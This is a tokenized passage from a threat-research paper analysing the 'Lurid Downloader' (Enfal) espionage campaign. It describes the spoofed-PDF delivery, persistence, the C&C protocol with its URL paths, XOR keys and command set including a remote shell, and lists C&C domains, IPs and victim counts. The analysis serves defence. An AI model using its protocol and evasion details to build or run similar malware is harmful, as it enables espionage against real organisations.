"Enfal", "itself", ",", "there", "appears", "to", "be", "several", "distinct", "sets", "of", "command", "and", "control", "infrastructure", "in", "use", "and", "the", "relationship", "among", "the", "threat", "actors", "operating", "these", "separate", "infrastructures", "remains", "unclear", "."], ["The", "\u201c", "Lurid", "Downloader", "\u201d", "attacks", "appear", "to", "be", "another", "separate", ",", "but", "related", "Enfal", "network", "with", "a", "geographic", "focus", "."], ["While", "there", "is", "clear", "evidence", "that", "the", "Tibetan", "community", "is", "also", "target", ",", "the", "victims", "of", "this", "attack", "are", "concentrated", "in", "Russia", "and", "other", "CIS", "countries", "."], ["Numerous", "embassies", "and", "government", "ministries", "have", "been", "compromised", "as", "well", "as", "research", "institutions", "and", "agencies", "related", "to", "the", "space", "industry", "."], ["4", "|", "RESEARCH", "PAPER"], ["THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "Our", "investigation", "began", "with", "an", "analysis", "of", "the", "\u201c", "Lurid", "Downloader", "\u201d", "malware", "."], ["Our", "objective", "was", "to", "document", "its", "functionality", "and", "map", "out", "its", "command", "and", "control", "network", "."], ["While", "this", "malware", "family", "is", "well", "known", ",", "there", "appear", "to", "be", "various", "associated", "threat", "actors", "using", "it", "to", "compromise", "targets", "in", "various", "geographic", "locations", "."], ["Similar", "versions", "of", "this", "malware", "have", "been", "used", "to", "target", "both", "the", "U.S.", "government", "and", "NGO", "\u2019s", "in", "the", "past", "."], ["We", "could", "\ufb01nd", "no", "direct", "links", "between", "this", "particular", "command", "and", "control", "network", "and", "the", "previously", "discovered", "ones", ";", "we", "believe", "that", "it", "is", "most", "likely", "a", "separate", ",", "but", "related", "network", "as", "they", "appear", "to", "each", "have", "a", "regional", "focus", "."], ["We", "uncovered", "a", "command", "and", "control", "network", "that", "consists", "of", "15", "domains", "names", "and", "10", "IP", "addresses", "."], ["We", "were", "able", "to", "retrieve", "a", "listing", "of", "the", "compromised", "computers", "connecting", "to", "these", "servers", "."], ["In", "total", ",", "we", "found", "1465", "unique", "hosts", "(", "Hostname", "+", "Mac", "address", "as", "stored", "by", "the", "C&C", ")", "with", "2272", "unique", "external", "IP", "addresses", "connecting", "to", "the", "command", "and", "control", "network", "primarily", "from", "Russia", "(", "1063", ")", ",", "Kazakhstan", "(", "325", ")", "and", "Ukraine", "(", "102", ")", "along", "with", "numerous", "other", "countries", "in", "the", "CIS", "(", "former", "Soviet", "Union", ")", "."], ["We", "were", "able", "to", "use", "reverse", "DNS", "and", "WHOIS", "lookups", "to", "determine", "the", "identity", "of", "47", "compromised", "hosts", "."], ["From", "the", "victims", "we", "were", "able", "to", "identify", ",", "there", "were", "concentrations", "of", "government", "ministries", "and", "diplomatic", "missions", "as", "well", "as", "spacerelated", "government", "agencies", ",", "companies", "and", "research", "institutions", "."], ["We", "found", "that", "the", "attackers", "embedded", "campaign", "codes", "inside", "the", "malware", "they", "propagated", "in", "order", "to", "keep", "track", "of", "the", "success", "of", "their", "campaigns", "."], ["In", "total", ",", "we", "found", "301", "campaign", "codes", "and", "there", "are", "high", "concentrations", "of", "victims", "within", "a", "single", "country", "for", "each", "instance", "of", "the", "malware", "campaign", "indicating"], ["that", "the", "distribution", "of"], ["the", "malware", "is", "targeted", "at", "speci\ufb01c", "countries", "or", "regions", "."], ["In", "addition", ",", "nearly", "60", "%", "of", "the", "campaigns", "only", "affected", "1", "or", "2", "victims", "indicating", "the", "precision", "with", "which", "the", "malware", "campaigns", "were", "conducted", "."], ["1"], ["For", "the", "attacks", "on", "Google", ",", "see", "http://googleblog.blogspot.com/2010/01/new-approach-to-china.html", "2", "http://www.cisco.com/en/US/prod/collateral/vpndevc/ps10128/ps10339/ps10354/targeted_attacks.pdf", "3", "http://about-threats.trendmicro.com/ArchiveMalware.aspx?language=us&name=TROJ_SHARP.R", "4"], ["http://events.ccc.de/congress/2007/Fahrplan/attachments/1008_Crouching_Powerpoint_Hidden_Trojan_24C3.pdf", ",", "http://isc.sans.org/presentations/SANSFIRE2008-Is_Troy_Burning_Vanhorenbeeck.pdf", ",", "http://isc.sans.edu/diary", "."], ["html?storyid=4177"], ["5"], ["While", "the", "domain", "names", "are", "present", "in", "the", "GhostNet", "report", ",", "they", "are", "not", "part", "of", "GhostNet", "but", "a", "completely", "different", "network", "of", "command", "and", "control", "servers", "that", "are", "actually", "associated", "with", "Enfal", "."], ["http://www.nartv.org/mirror/ghostnet.pdf", "and", "http://www.nartv.org/mirror/shadows-in-the-cloud.pdf", "6", "http://wikileaks.org/cable/2009/04/09STATE32025.html", "http://cablesearch.org/cable/view.php?id=08STATE116943", "and", "http://www.reuters.com/article/2011/04/14/us-china-usa-cyberespionage-idUSTRE73D24220110414", "5", "|", "RESEARCH", "PAPER", "THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "ATTACK", "VECTOR"], ["In", "a", "typical", "targeted", "malware", "attack", ",", "a", "target", "typically", "receives", "a", "socially", "engineered", "message", "\u2013", "such", "as", "an", "email", "or", "instant", "message", "\u2013", "that", "encourages", "the", "target", "to", "click", "on", "a", "link", "or", "open", "a", "\ufb01le", "."], ["The", "links", "and", "\ufb01les", "sent", "by", "the", "attacker", "contain", "malicious", "code", "that", "exploits", "vulnerabilities", "in", "popular", "software", "such", "as", "Adobe", "Reader", "(", "e.g.", "pdf", "\u2019s", ")", "and", "Microsoft", "Of\ufb01ce", "(", "e.g.", "doc", "\u2019s", ")", "."], ["The", "payload", "of", "these", "exploits", "is", "malware", "that", "is", "silently", "executed", "on", "the", "target", "\u2019s", "computer", "."], ["This", "allows", "the", "attackers", "to", "take", "control", "of", "the", "computer", "and", "obtain", "data", "from", "it", "."], ["The", "attackers", "may", "then", "move", "laterally", "throughout", "the", "target", "\u2019s", "network", "and", "are", "often", "able", "to", "maintain", "control", "over", "compromised", "computers", "for", "extended", "periods", "of", "time", "."], ["Ultimately", ",", "the", "attacks", "locate", "and", "ex-\ufb01ltrate", "sensitive", "information", "from", "the", "victim", "\u2019s", "network", "."], ["In", "this", "case", ",", "the", "delivery", "mechanism", "used", "was", "an", "email", "with", "a", "malicious", "PDF", "as", "an", "attachment", "."], ["The", "email", "had", "no", "content", ",", "just", "a", "subject", "line", "and", "an", "attachment", "."], ["The", "email", "message", "was", "spoofed", "to", "appear", "to", "be", "from", "ohhdl@dalailama.com", ",", "the", "Of\ufb01ce", "of", "the", "Dalai", "Lama", "and", "had", "a", "subject", "of", "\u201c", "Tibetan", "Losar", "Event", "on", "6", "March", "2011", "\u201d", "."], ["It", "also", "contained", "an", "attachment", "named", "\u201c", "LOSAR", "FLYER_edited-3.pdf", "\u201d", "."], ["The", "email", "was", "sent", "using", "an", "email", "provider", "called", "Gawab", "(", "gawab.com", ")", "which", "is", "popular", "in", "the", "Middle", "East", "."], ["The", "server", "used", "was", "info3.gawab.com", "(", "66.220.20.18", ")", "and", "the", "email", "address", "was", "emb107@gawab.com", "."], ["The", "originating", "IP", "address", "was", ":", "96.46.11.88", "(", "INTERNETXTUSA", ")", "."], ["While", "this", "IP", "address", "is", "assigned", "to", "the", "US", ",", "it", "is", "used", "by", "a", "VPN", "provider", "in", "China7", "."], ["If", "the", "attached", "PDF", "is", "opened", "with", "older", "versions", "of", "Adobe", "reader", ",", "malicious", "code", "is", "executed", "that", "drop", "malware", "on", "the", "target", "\u2019s", "system", "."], ["The", "malware", "then", "connects", "to", "a", "command", "and", "control", "server", "under", "the", "attacker", "\u2019s", "control", "."], ["At", "this", "time", ",", "the", "target", "\u2019s", "computer", "is", "compromised", "and", "under", "the", "full", "control", "of", "the", "attackers", "."], ["7", "http://www.ldvpn.cn/us-dongtai.html", "MALWARE"], ["MD5", "File", "Name", "Detection", "322fcf1b134fef1bae52fbd80a373ede", "LOSAR_FLYER_edited-3.pdf", "TROJ_PIDIEF.SMZX", "This", "PDF", "contains", "a", "JavaScript", "stream", "that", "exploits", "the", "util.printd", "vulnerability", "(", "CVE2009", "-", "4324", ")", "that", "affects", "Adobe", "Reader", "9.x"], ["(", "before", "9.3", ")", "and", "8.x", "(", "before", "8.2", ")", "."], ["MD5", "File", "Name", "Detection", "84d24967cb5cbacf4052a3001692dd54", "ctfmon.exe", "TROJ_MECIV.A"], ["This", "PDF", "contains", "a", "JavaScript", "stream", "that", "exploits", "the", "util.printd", "vulnerability", "(", "CVE-2009", "-", "4324", ")", "that", "affects", "Adobe", "Reader", "9.x"], ["(", "before", "9.3", ")", "and", "8.x", "(", "before", "8.2", ")", "."], ["6", "|", "RESEARCH", "PAPER"], ["MD5", "File", "Name", "Detection", "3447416fbbc65906bd0384d4c2ba479e", "mspmsnsr.dll[chars", "]"], ["TROJ_MECIV.A"], ["THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "After", "successful", "exploitation", ",", "two", "malware", "components", "are", "created", "."], ["One", "is", "a", "dropper", "(", "ctfmon.exe", ")", "that", "installs", "a", "windows", "service", "."], ["The", "service", "loads", "the", "dropped", "dll", "\ufb01le", "mspmsnsr.dll", "<", "long", "string", "of", "characters", ">", "."], ["The", "malicious", "Windows", "service", "stores", "its", "con\ufb01guration", "settings", "in", "the", "registry", ":", "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WmdmPmSp\\Parameters"], ["This", "malware", "identi\ufb01es", "itself", "as", "version", "2.14", "."], ["During", "the", "course", "of", "our", "investigation", ",", "we", "discovered", "another", "version", "of", "the", "malware", "that", "identi\ufb01es", "itself", "as", "version", "2.15", "."], ["MD5", "File", "Name", "Detection", "856de08a947a40e00ea7ed66b8e02c53", "isssync.exe", "WORM_OTORUN.TMP", "Instead", "of", "a", "Windows", "service", ",", "version", "2.15", "is", "just", "a", "single", "executable", "that", "copies", "itself", "to", "the", "system", "folder", "and", "ensures", "persistence", "by", "changing", "the", "common", "start", "folder", "of", "windows", "to", "a", "special", "one", "it", "creates", "."], ["It", "then", "copies", "all", "the", "usual", "auto", "-", "start", "items", "there", ",", "as", "well", "as", "itself", "."], ["The", "existence", "of", "this", "folder", "is", "constantly", "checked", "and", "redone", "if", "the", "user", "or", "any", "program", "switches", "it", "back", "to", "normal", "."], ["The", "Trojan", "collects", "information", "from", "the", "computer", "and", "sends", "it", "via", "HTTP", "POST", "."], ["The", "information", "it", "collects", "is", "the", "following", ":", "\u2022"], ["\u2022", "\u2022"], ["\u2022", "\u2022", "Computer", "name", "MAC", "address", "computer", "OS", "and", "version", "IP", "address", "and", "codepage", "language", "of", "the", "operating", "system", "."], ["It", "constantly", "communicates", "with", "a", "C&C", "server", "to", "perform", "certain", "info", "-", "stealing", "tasks", "."], ["The", "main", "feature", "of", "the", "Trojan", "is", "that", "all", "communication", "is", "started", "by", "the", "client", "by", "http", "."], ["Firewalls", "and", "other", "security", "devices", "will", "never", "see", "any", "communication", "from", "outside", "in", "."], ["Even", "the", "interactive", "command", "line", "is", "built", "this", "way", "so", "everything", "is", "done", "from", "the", "inside", "out", "."], ["The", "communication", "is", "always", "encrypted", "although", "it", "\u2019s", "a", "simple", "XOR", "singlebyte", "encryption", "."], ["This", "means", "that", "network", "security", "devices", "wo", "n\u2019t", "readily", "see", "anything", "suspicious", "going", "on", "."], ["7", "|", "RESEARCH", "PAPER"], ["THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "COMMUNICATION", "WITH", "THE", "COMMAND", "AND", "CONTROL", "SERVER"], ["When", "malware", "is", "executed", "on", "the", "target", "\u2019s", "system", "it", "\u201c", "checks", "in", "\u201d", "with", "one", "or", "more", "servers", "under", "the", "control", "of", "the", "attackers", "."], ["Command", "and", "control", "mechanisms", "allow", "the", "threat", "actors", "to", "con\ufb01rm", "that", "an", "attack", "has", "succeeded", "in", "addition", "to", "supplying", "them", "with", "some", "information", "about", "the", "target", "\u2019s", "computer", "and", "network", "."], ["From", "here", "on", ",", "the", "client", "communicates", "back", "to", "the", "control", "server", "expecting", "a", "command", ",", "allowing", "the", "attackers", "to", "issue", "commands", "to", "the", "compromised", "target", "."], ["All", "of", "the", "connections", "to", "the", "command", "and", "control", "servers", "use", "the", "HTTP", "protocol", "and", "request", "speci\ufb01c", "URL", "paths", "."], ["On", "startup", ",", "the", "malware", "connects", "to", "the", "command", "and", "control", "server", "and", "requests", "the", "path", "\u201c", "/trandocs", "/", "mm/", "\u201d", "(", "the", "path", "may", "differ", "with", "other", "samples", ",", "for", "example", "\u201c", "httpdocs", "/", "mm/", "or", "/iupw82", "/", "netstate", "\u201d", ")", "."], ["This", "appears", "to", "be", "a", "LOGIN", "connection", "and", "the", "server", "always", "responds", "with", "\u201c", "123", "\u201d", "."], ["The", "data", "transmitted", "to", "the", "command", "and", "control", "server", "consists", "of", "the", "following", ":", "Encrypted", "Password/<hostname>:<MAC>/<ip", "address", ">", "<", "OS", "name", ">", "<", "codepage>:<locale", ">", "<", "actual", "exe", "name", ">", "<", "campaign", "name", ">", "<", "y", "/", "n", ">", "(", "sys32time.ini", "exists", "?"], ["Is", "it", "1Mb", "or", "bigger", "?", ")"], ["<", "y", "/", "n", ">", "(", "ipop.dll", "exists", "?", ")"], ["<", "y", "/", "n", ">", "(", "always", "n", "in", "our", "samples", ")", "<", "malware", "version", ">", "(", "2.14", "or", "2.15", ")"], ["The", "encrypted", "password", "at", "the", "beginning", "of", "the", "LOGIN", "packet", "only", "appears", "on", "version", "2.15", "."], ["The", "sample", "we", "analyzed", "contains", "the", "password", "\u201c", "hallelujah", "\u201d", "and", "it", "is", "encrypted", "with", "\u201c", "ADD", "+", "FAh", "\u201d", "."], ["The", "earlier", "version", ",", "2.14", ",", "does", "not", "contain", "a", "password", "at", "all", "."], ["After", "the", "initial", "connection", ",", "the", "malware", "makes", "two", "kinds", "of", "connections", "to", "the", "command", "and", "control", "server", "every", "2", "minutes", "."], ["The", "\ufb01rst", "connection", "is", "a", "KEEPALIVE", "connection", "to", "the", "URL", "path", "\u201c", "/cgl", "-", "bin", "/", "Owpq4.cgi", "\u201d", "."], ["The", "malware", "posts", "information", "to", "the", "command", "and", "control", "server", "that", "identi\ufb01es", "the", "compromised", "machine", ":", "OS", "and", "version", ",", "\u201c", "campaign", "ID", "\u201d", "and", "malware", "version", "."], ["The", "second", "connection", "is", "an", "ASKCMD", "connection", "to", "a", "URL", "with", "the", "path", "\u201c", "/trandocs", "/", "mm/", "<", "machine_name>:<MAC", "address>/Cmwhite", "\u201d", "."], ["The", "contents", "of", "\u201c", "Cmwhite", "\u201d", "contain", "commands", "that", "are", "sent", "by", "the", "attackers", "to", "the", "compromised", "computer", "."], ["The", "range", "of", "possible", "commands", "will", "be", "discussed", "below", "."], ["When", "the", "command", "\ufb01le", ",", "\u201c", "Cmwhite", "\u201d", "is", "downloaded", ",", "the", "malware", "\ufb01rst", "acknowledges", "the", "receipt", "of", "the", "command", "by", "issuing", "an", "ACKCMD", "connection", "to", "\u201c", "/cgl", "-", "bin", "/", "Clnpp5.cgi", "\u201d", "."], ["Once", "the", "command", "is", "interpreted", "and", "performed", ",", "the", "malware", "issues", "a", "CMDDONE", "request", "to", "\u201c", "/cgl", "-", "bin", "/", "Rwpq1.cgi", "\u201d", "."], ["It", "contains", "the", "results", "of", "the", "command", "and", ",", "if", "relevant", ",", "a", "result", "code", "that", "indicates", "any", "error", "encountered", "."], ["When", "there", "is", "no", "command", "set", "by", "the", "attackers", "for", "the", "victim", "computer", ",", "the", "command", "and", "control", "server", "returns", "a", "\u201c", "404", "NOT", "FOUND", "\u201d", "error", "page", "."], ["This", "is", "never", "interpreted", "correctly", "as", "a", "command", "and", "therefore", "ignored", "."], ["8", "|", "RESEARCH", "PAPER"], ["THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "COMMANDS"], ["The", "command", "packet", "that", "is", "contained", "within", "the", "\u201c", "Cmwhite", "\u201d", "response", "is", "encrypted", "."], ["In", "the", "samples", "we", "analyzed", ",", "it", "is", "encrypted", "with", "XOR", "45h", "."], ["Other", "communication", "packets", "observed", "suggest", "that", "there", "are", "other", "keys", "in", "use", "but", "they", "are", "always", "a", "single", "byte", "."], ["Once", "decrypted", ",", "this", "is", "what", "a", "command", "packet", "contains", ":"], ["First", "two", "bytes", ":", "40", "40", "."], ["(", "This", "is", "just", "a", "magic", "number", ")", "."], ["Third", "byte", ":", "Command", "code", "."], ["Fourth", "byte", ":", "Return", "code", "."], ["(", "This", "only", "used", "in", "the", "CMDDONE", "packet", "to", "indicate", "error", "/", "success", ")", "."], ["From", "the", "Fifth", "byte", "on", ",", "the", "command", "carries", "parameters", ",", "which", "vary", "depending", "on", "the", "nature", "of", "the", "command", "."], ["The", "range", "of", "commands", "available", "to", "the", "attackers", "that", "are", "enumerated", "below", "demonstrate", "the", "level", "of", "control", "the", "attackers", "have", "over", "their", "victims", "."], ["In", "addition", "to", "functionality", "that", "allows", "the", "attackers", "to", "send", "and", "receive", "\ufb01les", ",", "they", "are", "able", "to", "activate", "an", "interactive", "remote", "shell", "on", "compromised", "systems", "."], ["Range", "of", "commands", "9", "|", "RESEARCH", "PAPER", "Command", "01"], ["ECHO"], ["It", "echoes", "back", "the", "word", "contained", "in", "bytes", "5", "and", "6", "."], ["There", "\u2019s", "another", "parameter", ",", "which", "is", "supposed", "to", "contain", "the", "string", "\u201c", "ibme54", "\u201d", "."], ["If", "this", "is", "right", ",", "it", "keeps", "an", "internal", "counter", "of", "how", "many", "of", "these", "ECHO", "packets", ",", "it", "has", "received", "."], ["Command", "02", "IPOP", "LOAD", "CHECK"], ["It", "checks", "if", "the", "previous", "check", "for", "the", "\ufb01le", "c:\\windows\\system32\\ipop", "."], ["dll", "was", "successful", "."], ["It", "returns", "a", "y", "/", "n", "condition", "."], ["Command", "03", "SEND", "FILE"], ["When", "the", "client", "receives", "this", "command", ",", "it", "retrieves", "a", "\ufb01le", "and", "sends", "it", "to", "the", "C&C", "server", "."], ["The", "\ufb01lename", "is", "a", "parameter", "in", "the", "command", "packet", "."], ["Command", "04", "RECV", "FILE"], ["This", "command", "has", "two", "parameters", ",", "the", "\ufb01lename", "and", "the", "data", "."], ["The", "client", "creates", "the", "\ufb01le", "with", "the", "data", "in", "the", "packet", "."], ["It", "does", "this", "by", "constantly", "communicating", "with", "a", "Ufwhite", "URL", "."], ["This", "URL", "is", "accessed", "repeatedly", "in", "order", "to", "keep", "receiving", "chunks", "of", "the", "data", "\ufb01le", "and", "appending", "it", "to", "the", "\ufb01le", "."], ["When", "there", "\u2019s", "no", "more", "data", ",", "the", "\ufb01le", "is", "closed", "and", "operation", "is", "\ufb01nished", "."], ["After", "each", "packet", "is", "correctly", "received", ",", "the", "client", "sends", "a", "report", "packet", "to", "Clnpp5.cgi", "specifying", "that", "it", "was", "Ufwhite", "who", "started", "this", "operation", "."], ["Command", "05", "CMDEXEC"], ["It", "accepts", "a", "single", "command", "and", "executes", "it", "in", "the", "victim", "system", "."], ["Command", "06", "DELETE", "FILE"], ["It", "accepts", "a", "\ufb01lename", "string", "as", "a", "parameter", "."], ["It", "deletes", "the", "\ufb01le", "."], ["Command", "07", "MOVE", "FILE"], ["It", "accepts", "two", "\ufb01lenames", "."], ["It", "moves", "the", "\ufb01le", "from", "source", "to", "target", "destination", "."], ["Command", "09", "LS"], ["When", "the", "client", "receives", "this", "command", ",", "its", "proceeds", "to", "list", "the", "\ufb01les", "within", "a", "speci\ufb01ed", "directory", "and", "sends", "the", "list", "back", "in", "a", "response", "packet", "."], ["Command", "0A", "When", "the", "client", "receives", "this", "command", ",", "it", "stays", "in", "interactive", "mode", "."], ["It", "starts", "connecting", "to", "Clnpp5.cgi", "expecting", "a", "command", "."], ["These", "commands", "are", "then", "executed", "and", "error", "codes", "sent", "straight", "away", "until", "an", "\u201c", "exit", "\u201d", "command", "is", "received", "."], ["The", "interactive", "commands", "have", "a", "special", "tag", "to", "set", "them", "apart", "from", "regular", "commands", "."], ["This", "tag", "is", "\u201c", "1234", "\u201d", "."], ["The", "way", "this", "interactive", "system", "is", "implemented", "is", "the", "INTERACTIVE", "MODE"], ["following", ":", "The", "command", "is", "run", "in", "the", "same", "way", "as", "command", "05", "but", "the", "output", "is", "redirected", "to", "a", "\ufb01le", "(", "c:\\Documents", "and", "Settings\\<user>\\", "SendTo\\msacm.dat", ")", "."], ["The", "contents", "of", "the", "\ufb01le", "are", "then", "sent", "in", "the", "return", "packet", "to", "Clnpp5.cgi", "."], ["Once", "the", "\u201c", "exit", "\u201d", "command", "has", "been", "received", ",", "this", "mode", "is", "interrupted", "."], ["While", "this", "mode", "is", "going", "on", ",", "the", "Trojan", "still", "sends", "keepalive", "and", "regular", "command", "requests", "packets", "."], ["THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "Command", "0B", "MKDIR"], ["The", "client", "creates", "a", "directory", "Command", "0E", "TERMINATE", "PROCESS"], ["The", "client", "tries", "to", "terminate", "a", "given", "thread", "in", "the", "system", "."], ["Command", "10", "EXEC", "NFAL", "When", "this", "command", "is", "received", ",", "the", "client", "tries", "to", "execute", "the", "\ufb01le", "c:\\"], ["windows\\system32\\nfal.exe", "."], ["This", "\ufb01le", "does", "not", "exist", "on", "an", "infected", "system", "normally", "so", "it", "must", "be", "a", "placeholder", "for", "a", "command", "\ufb01le", "uploaded", "to", "the", "victim", "."], ["Command", "40", "PING"], ["When", "this", "command", "is", "received", ",", "the", "Trojan", "just", "sends", "back", "an", "empty", "packet", "with", "a", "success", "code", "condition", "."], ["TOOL", "MARKS"], ["The", "terms", "\u201c", "tool", "marks", "\u201d", "refers", "to", "characteristics", "contained", "within", "malware", "that", "indicate", "that", "they", "are", "part", "of", "the", "same", "campaign", "or", "related", "to", "speci\ufb01c", "threat", "actors8", "."], ["In", "this", "case", ",", "the", "attackers", "left", "the", "PDB", "path", "in", "the", "malware", "samples", "we", "analyzed", "which", "indicate", "the", "name", "of", "the", "project", ":", "e:\\programs\\LuridDownLoader\\LuridDownloader", "for", "Falcon\\DllServiceTrojan\\Release\\DllServiceTrojan.pdb"], ["e:\\programs\\LuridDownLoader\\LuridDownloader", "for", "Falcon\\ServiceDll\\Release\\", "ServiceDll.pdb"], ["We", "named", "this", "campaign", "of", "targeted", "attacks", "\u201c", "Lurid", "DownLoader", "\u201d", "based", "on", "the", "project"], ["name", "the", "attackers", "have", "given", "to", "their", "own", "malware", "."], ["8", "http://mobile.darkreading.com/9287/show/571d636618a7ba35b7e9bae872fc5bfd&t=ebba8420c261102635de4d20bdd772f2", "COMMAND", "AND", "CONTROL", "INFRASTRUCTURE"], ["Attackers", "often", "maintain", "a", "network", "of", "command", "and", "control", "servers", ",", "not", "just", "a", "single", "one", "."], ["Often", ",", "the", "malware", "used", "in", "targeted", "attacks", "contains", "one", "or", "more", "command", "and", "control", "locations", "."], ["By", "linking", "together", "the", "domain", "names", "that", "are", "present", "in", "related", "malware", "samples", ",", "along", "with", "domain", "names", "registered", "by", "the", "same", "email", "address", "and", "domain", "names", "hosted", "on", "the", "same", "web", "servers", "we", "were", "able", "to", "map", "out", "the", "command", "and", "control", "infrastructure", "of", "the", "attackers", "."], ["In", "total", ",", "we", "found", "15", "domain", "names", "associated", "with", "the", "attackers", "and", "10", "active", "IP", "addresses", "."], ["The", "domain", "names", "were", "registered", "by", "two", "different", "email", "addresses", "\u201c", "bruce_tuner@yahoo.com", "\u201d", "and", "\u201c", "icqmaster@163.com", "\u201d", "."], ["10", "|", "RESEARCH", "PAPER", "THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "DOMAINS", "REGISTRATIONS", "mailru-vip.com", "yandex-vip.com"], ["google-of\ufb01ceonline.com"], ["of\ufb01ce-helppane.com", "foxit-pro.com"], ["ymail-vip.com", "ymail-pro.com"], ["yandex-pro.com"], ["google-of\ufb01ce.com", "mailru-pro.com", "xiaohu", "wang", "bruce_tuner@yahoo.com"], ["+86.01089464156", "fax", ":", "+86.01089464156", "bei", "jing", "shi", "beijing", "beijing", "102600", "CN", "hoticq.com", "redhag.com", "zadhc.com", "lasmail.com", "hotoicq.com", "jason", "bush"], ["icqmaster@163.com"], ["+86.01062311307", "fax", ":", "+86.01062311307", "No.20", "Xueyuan", "Road", ",", "Haidian", "District", ",", "Beijing", "beijing", "beijing", "100083", "CN", "Rather", "than", "use", "the", "\u201c", "root", "\u201d", "domains", ",", "the", "attackers", "use", "a", "variety", "of", "sub", "-", "domains", "."], ["These", "various", "sub", "-", "domains", "resolve", "to", "10", "different", "IP", "address", "spread", "across", "3", "different", "IP", "address", "ranges", "assigned", "to", "2", "providers", ":", "Krypt", "Technologies", "in", "the", "U.S.", "and", "UK2/100", "mb", "in", "the", "U.K."], ["Additional", "malware", "samples", "that", "connect", "to", "this", "command", "and", "control", "infrastructure", "are", ":", "11", "|", "RESEARCH", "PAPER", "MD5", "Domain", "IP", "ADDRESS"], ["ed69041fbe470fe0f2c1fd837efcb6e7"], ["ace.mailru-vip.com", "home.mailru-pro.com"], ["xphlp.ymail-vip.com", "173.212.195.216", "d66948e4e90baff08d24c77c93788597", "ace.mailru-vip.com"], ["home.mailru-pro.com"], ["xphlp.ymail-vip.com"], ["173.212.195.216", "2d93cbe969d3b5f02d4f9f1a3eb39b85"], ["ace.mailru-vip.com", "home.mailru-pro.com"], ["xphlp.ymail-vip.com"], ["173.212.195.216", "465ca2eef82b412949eeaa9fa3cc5c75", "setup.mailru-vip.com", "109.123.126.143", "e1833932053171da15c60e6c2fca708a", "superkiller.mailru-vip.com"], ["sexinsex.ymail-vip.com", "109.123.126.156", "e38ccff8e7fb922fe48b54b4032fec50", "setup.mailru-vip.com", "109.123.126.143"], ["(", "184.95.36.75", ")", "744670ca4531f7ceb72a75ae456e8215", "microsoft.of\ufb01ce-helppane.com", "109.123.126.151", "f0f31112af491f56af7cc0802ba96c0f", "microsoft.of\ufb01ce-helppane.com"], ["win.foxit-pro.com", "update.ymail-vip.com", "109.123.126.151"], ["106.123.126.151", "2a21eb36cc2a0a24149a4821aa328b7b", "microsoft.of\ufb01ce-helppane.com", "109.123.126.151", "5403e0bda1db72e5e862e9169db4e1d7", "led.of\ufb01ce-helppane.com", "174.139.13.122"], ["(", "184.95.36.75", ")", "57d99d67c3e8987e812c9332d6774794"], ["press.foxit-pro.com", "963e39d8675b5bb3d2f4e6da45c51bb0", "press.mailru-pro.com"], ["(", "184.22.240.174", ")", "166d6cd28c9df20c30fed220a3132345", "press.ymail-pro.com", "46.23.67.226", "89b98f66650cb29d0926713fda3b5bbc", "press.ymail-pro.com", "46.23.67.226", "(", "184.22.251.12", ")"], ["THE", "\u201c", "LURID", "\u201d", "DOWNLOADER"], ["The", "\u201c", "Lurid", "\u201d", "Downloader", "THREATS", "TRENDS", "AND", "SECURITY", "ISSUES", "DIRECT", "FROM", "THE", "EXPERTS", "d8815fe64eb5321add412554908da28a", "help.lasmail.com", "109.123.126.157", "22caf76a780c54ddce7fa139100fa54e"], ["mail.lasmail.com", "109.123.126.157"], ["(", "58.64.149.29", ")"], ["140c69ea9a963100e75497b33820f1da", "help.lasmail.com"], ["109.123.126.157", "(", "204.12.197.70", ")", "8f65204d8440b7be2b52908e35d19124"], ["mail.lasmail.com", "109.123.126.157"], ["(", "58.64.149.29", ")"], ["(", "204.12.197.70", ")", "f993d4cabe5021c96d6a80192f142dca", "support.hotoicq.com", "109.123.126.157"], ["74bdabd1077d640f7d21c6cfb14a0348", "204.12.197.70", "109.123.126.157", "(", "58.64.149.29", ")", "22caf76a780c54ddce7fa139100fa54e"], ["mail.lasmail.com", "140c69ea9a963100e75497b33820f1da", "help.lasmail.com", "8f65204d8440b7be2b52908e35d19124"], ["mail.lasmail.com", "109.123.126.157"], ["(", "58.64.149.29", ")"], ["(", "204.12.197.70", ")", "f993d4cabe5021c96d6a80192f142dca", "support.hotoicq.com", "109.123.126.157"], ["74bdabd1077d640f7d21c6cfb14a0348", "109.123.126.157"], ["(", "204.12.197.70", ")", "204.12.197.70", "COMPROMISED", "ORGANIZATIONS"], ["After", "mapping", "out", "and", "monitoring", "the", "command", "and", "control", "network", "used", "in", "this", "campaign", "we", "were", "able", "to", "retrieve", "a", "listing", "of", "the", "compromised", "computers", "connecting", "to", "these", "servers", "."], ["This", "list", "of", "compromised", "computers", "contains", "1465", "unique", "hosts"], ["(", "Hostname", "+", "Mac", "address", "as", "stored", "by", "the", "C&C", ")", "with", "2272", "unique", "external", "IP", "addresses", "connecting", "to", "the", "command", "and", "control", "network", "primarily", "from", "Russia", "(", "1063", ")", ",", "Kazakhstan", "(", "325", ")", "and", "Ukraine", "(", "102", ")", "along", "with", "numerous", "other", "countries", "in", "the", "CIS", "(", "former", "Soviet", "Union", ")", "."], ["There", "were", "also", "signi\ufb01cant", "numbers", "of", "compromises", "in", 